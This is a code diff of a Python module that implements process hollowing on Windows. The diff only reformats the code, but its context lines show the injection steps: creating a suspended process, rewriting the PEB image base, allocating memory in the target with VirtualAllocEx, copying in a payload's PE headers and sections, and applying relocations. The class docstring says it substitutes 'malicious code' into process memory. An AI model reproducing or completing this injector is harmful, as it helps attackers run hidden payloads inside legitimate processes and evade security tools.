@@ -32,6 +32,7 @@ logger = get_logger(__name__)
 if is_windows_available():
     try:
         import pefile
+
         AVAILABLE = True
     except ImportError as e:
         logger.error("Import error in process_hollowing: %s", e)
@@ -45,6 +46,7 @@ else:
 IMAGE_REL_BASED_ABSOLUTE = 0
 IMAGE_REL_BASED_HIGHLOW = 3
 IMAGE_REL_BASED_DIR64 = 10
+
 
 class ProcessHollowing(BaseWindowsPatcher):
     """Process Hollowing - replace process memory with malicious code"""
@@ -83,12 +85,13 @@ class ProcessHollowing(BaseWindowsPatcher):
             payload_pe = pefile.PE(data=payload_data)
 
             # Create suspended process and handle result
-            success, process_info, context = self.create_and_handle_suspended_process(target_exe, logger)
+            success, process_info, context = self.create_and_handle_suspended_process(
+                target_exe, logger
+            )
             if not success:
                 return False
 
             try:
-
                 # Get image base from PEB
                 peb_addr = self._get_peb_address_from_context(context)
                 image_base = self._read_image_base_from_peb(
@@ -196,6 +199,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             finally:
                 # Clean up handles
                 from ...utils.system.windows_common import cleanup_process_handles
+
                 cleanup_process_handles(self.kernel32, process_info, logger)
 
         except Exception as e:
@@ -205,18 +209,21 @@ class ProcessHollowing(BaseWindowsPatcher):
     def _create_suspended_process(self, exe_path: str) -> dict | None:
         """Create a process in suspended state"""
         from ...utils.system.windows_structures import WindowsProcessStructures
+
         structures = WindowsProcessStructures()
         return structures.create_suspended_process(exe_path)
 
     def _get_thread_context(self, thread_handle: int) -> Any | None:
         """Get thread context"""
         from ...utils.system.windows_structures import WindowsContext
+
         context_helper = WindowsContext()
         return context_helper.get_thread_context(thread_handle)
 
     def _set_thread_context(self, thread_handle: int, context: Any) -> bool:
         """Set thread context"""
         from ...utils.system.windows_structures import WindowsContext
+
         context_helper = WindowsContext()
         return context_helper.set_thread_context(thread_handle, context)
 
@@ -260,8 +267,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             logger.error(f"Failed to read image base: {e}")
             return 0
 
-    def _write_image_base_to_peb(self, process_handle: int, peb_addr: int,
-                                new_base: int) -> bool:
+    def _write_image_base_to_peb(self, process_handle: int, peb_addr: int, new_base: int) -> bool:
         """Write new image base to PEB"""
         try:
             if ctypes.sizeof(ctypes.c_void_p) == 8:  # 64-bit
@@ -300,8 +306,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             logger.error(f"Failed to unmap section: {e}")
             return False
 
-    def _allocate_memory(self, process_handle: int, preferred_addr: int,
-                        size: int) -> int:
+    def _allocate_memory(self, process_handle: int, preferred_addr: int, size: int) -> int:
         """Allocate memory in target process"""
         try:
             allocated = self.kernel32.VirtualAllocEx(
@@ -328,8 +333,9 @@ class ProcessHollowing(BaseWindowsPatcher):
             logger.error(f"Failed to allocate memory: {e}")
             return 0
 
-    def _write_headers(self, process_handle: int, base_addr: int,
-                      payload_data: bytes, payload_pe: Any) -> bool:
+    def _write_headers(
+        self, process_handle: int, base_addr: int, payload_data: bytes, payload_pe: Any
+    ) -> bool:
         """Write PE headers to target process"""
         try:
             headers_size = payload_pe.OPTIONAL_HEADER.SizeOfHeaders
@@ -349,15 +355,15 @@ class ProcessHollowing(BaseWindowsPatcher):
             logger.error(f"Failed to write headers: {e}")
             return False
 
-    def _write_sections(self, process_handle: int, base_addr: int,
-                       payload_data: bytes, payload_pe: Any) -> bool:
+    def _write_sections(
+        self, process_handle: int, base_addr: int, payload_data: bytes, payload_pe: Any
+    ) -> bool:
         """Write PE sections to target process"""
         try:
             for section in payload_pe.sections:
                 section_addr = base_addr + section.VirtualAddress
                 section_data = payload_data[
-                    section.PointerToRawData:
-                    section.PointerToRawData + section.SizeOfRawData
+                    section.PointerToRawData : section.PointerToRawData + section.SizeOfRawData
                 ]
 
                 if section_data:
@@ -380,8 +386,7 @@ class ProcessHollowing(BaseWindowsPatcher):
             logger.error(f"Failed to write sections: {e}")
             return False
 
-    def _process_relocations(self, process_handle: int, new_base: int,
-                           payload_pe: Any) -> bool:
+    def _process_relocations(self, process_handle: int, new_base: int, payload_pe: Any) -> bool:
         """Process PE relocations for new base address"""
         try:
             if not hasattr(payload_pe, "DIRECTORY_ENTRY_BASERELOC"):
